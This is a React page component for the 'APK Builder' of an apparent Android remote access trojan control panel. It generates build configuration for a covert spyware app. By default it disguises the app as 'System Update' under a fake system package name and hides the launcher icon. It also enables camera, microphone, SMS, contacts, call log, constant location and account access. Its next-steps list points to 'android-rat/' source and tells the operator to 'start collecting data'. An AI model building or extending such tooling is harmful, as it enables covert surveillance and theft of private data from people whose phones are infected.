import React, { useState, useEffect } from 'react';
import { apkBuilderAPI } from '../services/api';
import { toast } from 'react-toastify';
import {
  FiTool,
  FiServer,
  FiSmartphone,
  FiPackage,
  FiEyeOff,
  FiCamera,
  FiHardDrive,
  FiMapPin,
  FiMic,
  FiMessageSquare,
  FiUsers,
  FiPhone,
  FiKey,
  FiClipboard,
  FiInfo,
  FiCheckCircle,
  FiLoader,
} from 'react-icons/fi';
import LoadingSpinner from '../components/LoadingSpinner';

const PERMISSION_ICONS = {
  camera: FiCamera,
  storage: FiHardDrive,
  location: FiMapPin,
  microphone: FiMic,
  sms: FiMessageSquare,
  contacts: FiUsers,
  phone: FiPhone,
  callLogs: FiKey,
  accounts: FiKey,
};

const PERMISSION_LABELS = {
  camera: 'Camera (Front & Back)',
  storage: 'Storage Access (All Files)',
  location: 'Location (All Time)',
  microphone: 'Microphone',
  sms: 'SMS Access',
  contacts: 'Contacts',
  phone: 'Phone State',
  callLogs: 'Call Logs',
  accounts: 'Accounts List',
};

export default function ApkBuilder() {
  const [form, setForm] = useState({
    serverUrl: '',
    serverPort: '5000',
    appName: 'System Update',
    packageName: 'com.android.system.update',
    hideApp: true,
    permissions: {
      camera: true,
      storage: true,
      location: true,
      microphone: true,
      sms: true,
      contacts: true,
      phone: true,
      callLogs: true,
      accounts: true,
    },
  });

  const [generatedConfig, setGeneratedConfig] = useState(null);
  const [loading, setLoading] = useState(false);
  const [builderStatus, setBuilderStatus] = useState(null);

  useEffect(() => {
    apkBuilderAPI.getStatus()
      .then((res) => {
        if (res.data?.success) setBuilderStatus(res.data);
      })
      .catch(() => {});
  }, []);

  const handleChange = (field, value) => {
    setForm((prev) => ({ ...prev, [field]: value }));
  };

  const handlePermissionToggle = (perm) => {
    setForm((prev) => ({
      ...prev,
      permissions: { ...prev.permissions, [perm]: !prev.permissions[perm] },
    }));
  };

  const handleGenerate = async (e) => {
    e.preventDefault();
    if (!form.serverUrl) {
      toast.error('Server URL is required');
      return;
    }

    setLoading(true);
    try {
      const res = await apkBuilderAPI.generate(form);
      if (res.data?.success) {
        setGeneratedConfig(res.data.config);
        toast.success('APK configuration generated successfully');
      }
    } catch (err) {
      toast.error(err.response?.data?.message || 'Failed to generate configuration');
    } finally {
      setLoading(false);
    }
  };

  const toggleAllPermissions = (enable) => {
    setForm((prev) => {
      const newPerms = {};
      Object.keys(prev.permissions).forEach((key) => {
        newPerms[key] = enable;
      });
      return { ...prev, permissions: newPerms };
    });
  };

  return (
    <div className="space-y-6">
      <div className="flex items-center gap-3">
        <FiTool className="text-2xl text-primary-400" />
        <h1 className="text-2xl font-bold text-white">APK Builder</h1>
      </div>

      {/* Status Banner */}
      {builderStatus && (
        <div className="card p-4 flex items-start gap-3">
          <FiInfo className="text-xl text-primary-400 flex-shrink-0 mt-0.5" />
          <div className="text-sm text-gray-300">
            <p>APK Builder generates configuration that the Android client source code reads at build time.</p>
            <p className="text-gray-500 mt-1 flex items-center gap-2">
              <FiCheckCircle className="text-green-400" />
              Supported Android: {builderStatus.supportedAndroidVersions?.join(', ') || '10-16'} | 
              Min SDK: {builderStatus.minSdk} | 
              Target SDK: {builderStatus.targetSdk}
            </p>
          </div>
        </div>
      )}

      <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
        {/* Configuration Form */}
        <div className="card p-6">
          <h2 className="text-lg font-semibold text-white mb-4 flex items-center gap-2">
            <FiPackage className="text-primary-400" />
            APK Configuration
          </h2>

          <form onSubmit={handleGenerate} className="space-y-4">
            <div>
              <label className="block text-sm font-medium text-gray-300 mb-1.5 flex items-center gap-2">
                <FiServer className="text-gray-500" />
                Server URL <span className="text-red-400">*</span>
              </label>
              <input
                type="text"
                className="input-field"
                placeholder="https://your-server.onrender.com"
                value={form.serverUrl}
                onChange={(e) => handleChange('serverUrl', e.target.value)}
                required
              />
              <p className="text-xs text-gray-500 mt-1">The URL where your backend server is deployed</p>
            </div>

            <div className="grid grid-cols-2 gap-4">
              <div>
                <label className="block text-sm font-medium text-gray-300 mb-1.5">Server Port</label>
                <input
                  type="text"
                  className="input-field"
                  value={form.serverPort}
                  onChange={(e) => handleChange('serverPort', e.target.value)}
                />
              </div>
              <div>
                <label className="block text-sm font-medium text-gray-300 mb-1.5 flex items-center gap-2">
                  <FiSmartphone className="text-gray-500" />
                  App Name
                </label>
                <input
                  type="text"
                  className="input-field"
                  value={form.appName}
                  onChange={(e) => handleChange('appName', e.target.value)}
                />
              </div>
            </div>

            <div>
              <label className="block text-sm font-medium text-gray-300 mb-1.5">Package Name</label>
              <input
                type="text"
                className="input-field"
                value={form.packageName}
                onChange={(e) => handleChange('packageName', e.target.value)}
              />
              <p className="text-xs text-gray-500 mt-1">Unique identifier for the app</p>
            </div>

            {/* Toggle: Hide App */}
            <div className="flex items-center justify-between p-3 bg-dark-700/50 rounded-lg">
              <div className="flex items-center gap-3">
                <FiEyeOff className="text-gray-400" />
                <div>
                  <p className="text-sm font-medium text-white">Hide App Icon</p>
                  <p className="text-xs text-gray-500">App icon will be hidden from launcher</p>
                </div>
              </div>
              <label className="relative inline-flex items-center cursor-pointer">
                <input
                  type="checkbox"
                  className="sr-only peer"
                  checked={form.hideApp}
                  onChange={(e) => handleChange('hideApp', e.target.checked)}
                />
                <div className="w-11 h-6 bg-dark-600 peer-focus:outline-none peer-focus:ring-2 peer-focus:ring-primary-500 rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:border-gray-300 after:border after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-primary-600"></div>
              </label>
            </div>

            {/* Permissions */}
            <div>
              <div className="flex items-center justify-between mb-2">
                <p className="text-sm font-medium text-gray-300">Permissions</p>
                <div className="flex gap-2">
                  <button
                    type="button"
                    onClick={() => toggleAllPermissions(true)}
                    className="text-xs text-primary-400 hover:underline"
                  >
                    Select All
                  </button>
                  <button
                    type="button"
                    onClick={() => toggleAllPermissions(false)}
                    className="text-xs text-gray-500 hover:underline"
                  >
                    Clear
                  </button>
                </div>
              </div>
              <div className="space-y-2">
                {Object.entries(PERMISSION_LABELS).map(([key, label]) => {
                  const Icon = PERMISSION_ICONS[key] || FiKey;
                  return (
                    <div key={key} className="flex items-center justify-between py-1.5 px-2 rounded-lg hover:bg-dark-700/30 transition-colors">
                      <span className="text-sm text-gray-300 flex items-center gap-2">
                        <Icon className="text-gray-500" />
                        {label}
                      </span>
                      <label className="relative inline-flex items-center cursor-pointer">
                        <input
                          type="checkbox"
                          className="sr-only peer"
                          checked={form.permissions[key]}
                          onChange={() => handlePermissionToggle(key)}
                        />
                        <div className="w-9 h-5 bg-dark-600 peer-focus:outline-none peer-focus:ring-2 peer-focus:ring-primary-500 rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:border-gray-300 after:border after:rounded-full after:h-4 after:w-4 after:transition-all peer-checked:bg-primary-600"></div>
                      </label>
                    </div>
                  );
                })}
              </div>
            </div>

            <button type="submit" disabled={loading} className="btn-primary w-full py-3 flex items-center justify-center gap-2">
              {loading ? (
                <><FiLoader className="animate-spin" /> Generating...</>
              ) : (
                <><FiTool /> Generate APK Config</>
              )}
            </button>
          </form>
        </div>

        {/* Generated Config Display */}
        <div className="card p-6">
          <h2 className="text-lg font-semibold text-white mb-4 flex items-center gap-2">
            <FiClipboard className="text-primary-400" />
            Generated Configuration
          </h2>

          {generatedConfig ? (
            <div className="space-y-4">
              <div className="bg-dark-950 rounded-lg p-4 overflow-x-auto">
                <pre className="text-xs text-green-400 font-mono whitespace-pre-wrap">
                  {JSON.stringify(generatedConfig, null, 2)}
                </pre>
              </div>

              <div className="bg-dark-700/50 rounded-lg p-4">
                <h3 className="text-sm font-medium text-white mb-2 flex items-center gap-2">
                  <FiCheckCircle className="text-green-400" />
                  Next Steps
                </h3>
                <ol className="text-sm text-gray-400 space-y-2 list-decimal list-inside">
                  <li>Create the Android project with the source code from <code className="text-primary-400 bg-dark-800 px-1 rounded">android-rat/</code></li>
                  <li>Replace the <code className="text-primary-400 bg-dark-800 px-1 rounded">Config.kt</code> file with the generated values above</li>
                  <li>Build the APK using Android Studio or gradle</li>
                  <li>Deploy the backend server and start collecting data</li>
                </ol>
              </div>

              <button
                onClick={() => {
                  navigator.clipboard.writeText(JSON.stringify(generatedConfig, null, 2));
                  toast.success('Copied to clipboard');
                }}
                className="btn-secondary text-sm flex items-center gap-2"
              >
                <FiClipboard /> Copy to Clipboard
              </button>
            </div>
          ) : (
            <div className="text-center py-12 text-gray-500">
              <FiTool className="text-5xl mx-auto mb-4 text-gray-600" />
              <p>Configure and generate to see the APK config</p>
              <p className="text-sm mt-2">The Android client uses this config at build time</p>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}